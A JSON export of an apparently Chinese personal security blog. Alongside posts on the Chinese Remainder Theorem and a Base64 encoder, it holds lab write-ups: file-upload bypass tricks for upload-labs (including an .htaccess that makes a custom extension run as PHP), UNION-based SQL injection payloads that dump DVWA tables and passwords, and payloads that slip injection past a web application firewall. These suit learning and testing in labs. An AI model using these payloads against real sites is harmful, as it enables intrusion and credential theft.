{"meta":{"title":"Mlins's blog","subtitle":"Will you believe me all the time?","description":null,"author":"Mlins","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"中国剩余定理","slug":"中国剩余定理","date":"2018-06-06T11:51:15.000Z","updated":"2018-06-06T11:52:22.000Z","comments":true,"path":"2018/06/06/中国剩余定理/","link":"","permalink":"http://yoursite.com/2018/06/06/中国剩余定理/","excerpt":"","text":"前不久的suctf的杂项的一道sandgame的py题，做了半天没做出来，后来说是涉及到中国剩余定理，我就去了解了一下，然后找了很多资料，其实我就是想找个公式，然后结合很多文章写的和自己的看法总结出: 若有一个数X分别被d1,d2,….,dn除得的余数分别为r1,r2,….,rn 则有公式:X=(R1r1+R2r2+….+Rnrn)%R R是d1,d2….dn的最小公倍数R1是除d1外d2,d3,….,dn的公倍数，但是必须满足R1%d1==1R2是除d2外d1,d3,….,dn的公倍数，但是必须满足R2%d2==1…..其他同理 还是去网上都有的例子:一个数X被3除余2被5除余3被7除余2求这个数 稍微整理一下: d=[3,5,7] r=[2,3,2] 然后则有X=(2R1+3R2+2*R3)%R 先求R1=57=35 因为35%3 != 1 所以352%3 ==1 所以R1=70 R2=3*7=21 因为21%5==1 所以R2=21 R3=3*5=15 因为15%7=1 所以R3=15 R=357=105 所以X=(702+213+15*2)%105=23 经验证可行，为此写了一个脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#coding:utf-8#多个最大公约数def m_gcd(l_list): lists=list(l_list) while len(lists) != 1: #两个值进行互换，若前者小于后者 if lists[0]&lt;lists[1]: t=lists[0] lists[0]=lists[1] lists[1]=t while lists[0]%lists[1] != 0: t=lists[1] lists[1]=lists[0]%lists[1] lists[0]=t #print(lists[0],lists[1]) lists.append(lists[1]) lists.remove(lists[0]) lists.remove(lists[0]) return lists[0]#求解最小公倍数def m_lcm(l_list,lcm): lists=list(l_list) result=1 for i in l_list: result*=i return result/lcm #中国剩余定理def China(d,r): R=[] #存储最小公倍数 for i in range(len(d)): s=list(d) s.remove(d[i]) Rs=m_lcm(s,m_gcd(s)) k=1 while Rs%d[i] != 1: k+=1 Rs*=k R.append(Rs) fi_lcm=m_lcm(d,m_gcd(d)) result=0 for i in range(len(R)): result+=R[i]*r[i] print(result%fi_lcm) China([3,5,7],[2,3,2]) //在此填入除数和余，[3,5,7]为除数 [2,3,2]是所对应的余 运行该脚本的结果:这个只是靠着自己的理解写的，所以列表里的元素不宜过多","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://yoursite.com/tags/algorithm/"}],"keywords":[]},{"title":"upload-labs(上)","slug":"upload-labs-上","date":"2018-06-04T14:29:14.000Z","updated":"2018-06-05T00:57:22.000Z","comments":true,"path":"2018/06/04/upload-labs-上/","link":"","permalink":"http://yoursite.com/2018/06/04/upload-labs-上/","excerpt":"","text":"这是文件上传绕过的思维导图 0x01 Pass-01这里是一个前端JS验证后缀名的代码这里我们先查看元素修改HTML代码将onsubmit=&quot;return checkFile()&quot;删除即可通过验证 0x02 Pass-02贴上主要代码123456789if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; 这里是文件类型绕过，只要抓包将文件的Content-Type属性改成允许上传的文件类型即可将这个改成image/jpeg即可成功上传 0x03 Pass-03123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR .'/'. $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; 这里做了很多处理，是不是觉得没有办法了，其实还是有的首先这里没有过滤.htaccess文件，所以我们可以通过上传此文件来构造一个解析漏洞.htaccess文件内容123&lt;FilesMatch \"mlins\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上传该文件之后，Apache会将所有后缀名为mlins的解析成php文件所以先上传.htaccess然后再上传一个1.mlins即可 0x04 Pass-04可通过第三关相同方法绕过 0x05 Pass-05第五关没有过滤文件后缀的大小写，所以上传1.PhP即可成功上传文件 0x06 Pass-06第六关没有删除前后空格，所以可上传一个1.php[空格]即可成功上传文件 0x07 Pass-07前面的关卡都有去点，但是这关没有，所以这个可以上传一个1.php.文件，可成功上传 0x08 Pass-08这里可以通过Windows的文件命名规范，也就是后缀加入::$DATA，即1.php::$DATA因为::$DATA是不合法，所以后面的包括::$DATA会被直接忽略，然后我们上传的就是1.php了","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"http://yoursite.com/tags/bypass/"}],"keywords":[]},{"title":"DWVA-SQL injection-low关卡","slug":"DWVA-SQL注入关卡","date":"2018-06-02T16:07:33.000Z","updated":"2018-06-03T12:43:42.000Z","comments":true,"path":"2018/06/03/DWVA-SQL注入关卡/","link":"","permalink":"http://yoursite.com/2018/06/03/DWVA-SQL注入关卡/","excerpt":"","text":"先查看源代码 123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; mysqli_close($GLOBALS[\"___mysqli_ston\"]);&#125;?&gt; 0x01判断注入点及类型是没有任何防护的，可以直接注入，所以在URL上输入id=1&#39;+and+1=1%23先判断是否存在注入点页面显示正常再输入id=1&#39;+and+1=2%23页面显示异常所以这里存在字符型的GET注入，其实看了源码就应该知道了 0x02猜字段数输入id=1&#39;+order+by+字段数%23当我输入到3的时候，页面显示Unknown column &#39;3&#39; in &#39;order clause&#39;表明查询语句只查了两个字段，通过源码我们也能看得出 0x03爆当前数据库名、用户名、以及数据库版本因为有两个字段数，所以我们接下来的语句是:id=1&#39;+union+select+1,2%23可以看到我们查询的1，2都显示出来了，我们就通过这个位置来爆我们想要的东西 然后输入id=1&#39;+union+select+1,concat(database(),&#39;|&#39;,version(),&#39;|&#39;,user())%23，因为concat函数是将字符串连接起来的函数，我们可以通过这个函数在一个位置爆出我们所有想要的东西，这里指当前数据库名、用户名以及版本。 0x04爆当前数据库的所有表名根据上一个环节可知数据库名为:dvwa然后根据数据id=1&#39;+union+select+1,table_name+from+information_schema.tables+where+table_schema=&#39;dvwa&#39;%23可爆出全部的表名table_name值得是表名的字段，table_schema表示要查询的数据库名，information_schema是一个系统库，里面包含了数据库所有的数据库。 0x05爆表里的字段名就爆users表里的字段吧输入id=1&#39;+union+select+1,column_name+from+information_schema.columns+where+table_schema=&#39;dvwa&#39;+and+table_name=&#39;users&#39;%23可爆出users表的所有字段 0x06爆字段的所有内容还是users表输入id=1&#39;+union+select+user,password+from+users%23由于每次只能查两个字段，所以这里我就只查user,和password字段","categories":[],"tags":[{"name":"dwva","slug":"dwva","permalink":"http://yoursite.com/tags/dwva/"},{"name":"sql","slug":"sql","permalink":"http://yoursite.com/tags/sql/"}],"keywords":[]},{"title":"Base64加密原理","slug":"Base64加密原理","date":"2018-06-02T16:07:33.000Z","updated":"2018-06-06T11:52:20.000Z","comments":true,"path":"2018/06/03/Base64加密原理/","link":"","permalink":"http://yoursite.com/2018/06/03/Base64加密原理/","excerpt":"","text":"回顾一下以前学的知识:Base64加密原理base64加密是先接受一串字符串，将其转化为二进制，然后再从前往后分组每组6个二进制位，不足6位的，再后面补0，如果补了几个00，则需要加密后再后面加几个=，下面就拿加密字符‘A’来讲解吧 1.将A转二进制010000012.把该二进制从前往后分6个二进制位一组，不足6位的后面补0: 010000 010000补了2个00，记下3.将二进制转化成十进制:16 164.根据base64独有字符表进行转化成字符16对应的是Q，所以转化之后的字符串为QQ5.填充=因为我们之前填充了两个00，所以最终加密结果为QQ==最后附上我用python写的一个简单加密程序12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding:utf-8 -*-decode=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',0,1,2,3,4,5,6,7,8,9,'+','/']str1=''result=''row=''i=0number=raw_input(\"Please input will encode string:\")print '\\n'for x in number: h=bin(ord(x))[2:] if len(h)&lt;8: #判断每个字符转为二进制后是否为8位，不足高位补0 h='0'+h str1+=h#将所有二进制位合并for x in str1: if x!=' ': result+=str(x) #Base64 加密过程while i&lt;len(result):#判断填充=的个数 if len(result)%6==0: a3='' elif len(result)%6==2: a3='==' elif len(result)%6==4: a3='=' else: print 'ERROR'#切割二进制位 8变6，不够填充00 str2=result[i:i+6] while len(str2)&lt;6: str2+='00' print 'bin:'+str2+' dec:'+str(int(str2,2))+' base64:'+str(decode[int(str2,2)]) row+=str(decode[int(str2,2)]) i+=6print '\\nSuccessful Eecode: '+row+a3","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://yoursite.com/tags/algorithm/"}],"keywords":[]},{"title":"Fuzz过狗注入","slug":"Fuzz过狗注入","date":"2018-05-31T13:13:14.000Z","updated":"2018-06-03T04:38:00.000Z","comments":true,"path":"2018/05/31/Fuzz过狗注入/","link":"","permalink":"http://yoursite.com/2018/05/31/Fuzz过狗注入/","excerpt":"今天在虚拟机上安装一个WEB安全狗，打算绕绕狗","text":"今天在虚拟机上安装一个WEB安全狗，打算绕绕狗然后也搭建一个sqli-labs注入环境先通过order by可判断字段数为3个，这里就不详细解释了当我们准备使用union select联合查询的时候，会被安全狗拦截原本打算写个脚本进行fuzz测试的，但是后来发现脚本跑出来的能绕狗，但是sql会报错，奇怪的是放入Mysql终端执行又能正常查询，没办法，只能手工fuzz测试 对于安全狗的拦截特征，个人理解是:123456因安全狗是根据特征来判断你输入的内容是否安全比如你单输入一个union不会被拦又或者你单输入一个select也不会被拦截但是如果你输入一个union select，就会被拦所以fuzz就是构造一些奇怪的字符又不会被数据库解析的东西从而来混淆安全狗的匹配规则 这里手工测试的过狗payload是:1?id=1+/*!union*//**//*!select*/+1,2,3+%23 可成功绕狗 然后就是查当前数据库名:1?id=-1+/*!union*//**//*!select*/+1,database/*!()*/,3+%23 接着查询表名，可通过修改limit 0,1的值来查询上下表1?id=-1+/*!union*//**//*!select*/+1,table_name,3+/*!from*//**//*!information_schema.tables*/+where+table_schema='security'+limit+0,1%23 继续查询字段名,可通过修改limit 0,1的值来查询上下字段1?id=-1+/*!union*//**//*!select*/+1,column_name,3+/*!from*//**//*!information_schema.columns*/+where+table_schema='security'/**//*!and*//**/table_name='users'+limit+1,1%23 最后就是查询字段内容,可通过修改limit 0,1来查询上下字段内容值1?id=-1+/*!union*//**//*!select*/+1,username,3+from+users+limit+1,1%23 是不是自己也想去试试呢？","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"http://yoursite.com/tags/bypass/"}],"keywords":[]}]}